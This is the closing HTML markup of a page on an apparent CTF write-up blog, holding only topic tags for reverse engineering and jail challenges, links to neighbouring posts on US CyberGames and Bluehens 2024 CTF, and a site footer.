</span></span></code></pre></div></section>

  <footer class="mt-12 flex flex-wrap"><a
      class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]"
      href="http://localhost:1313/tags/reverseengineering"
      >reverseengineering</a
    ><a
      class="mb-1.5 rounded-lg bg-black/[3%] px-5 py-1 no-underline hover:bg-black/[6%] ltr:mr-1.5 rtl:ml-1.5 dark:bg-white/[8%] dark:hover:bg-white/[12%]"
      href="http://localhost:1313/tags/jail"
      >jail</a
    ></footer><nav
    class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"
  ><a class="ltr:pr-3 rtl:pl-3" href="http://localhost:1313/posts/2025-06-20-uscybergames2025/"
      ><span class="ltr:mr-1.5 rtl:ml-1.5">â†</span><span>US CyberGames</span></a
    ><a
      class="justify-end pl-3 ltr:ml-auto rtl:mr-auto"
      href="http://localhost:1313/posts/2024-11-10-bluehensctf2024/"
      ><span>Bluehens 2024 CTF</span><span class="ltr:ml-1.5 rtl:mr-1.5">â†’</span></a
    ></nav></article></main><footer
  class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"
>
  <div class="mr-auto">&copy;2025
    <a class="link" href="http://localhost:1313/">Stephenx0r - CTF Writeups</a></div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >powered by hugoï¸ï¸</a
  >ï¸
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >hugo-paper</a
  >
</footer>
</body>
</html>
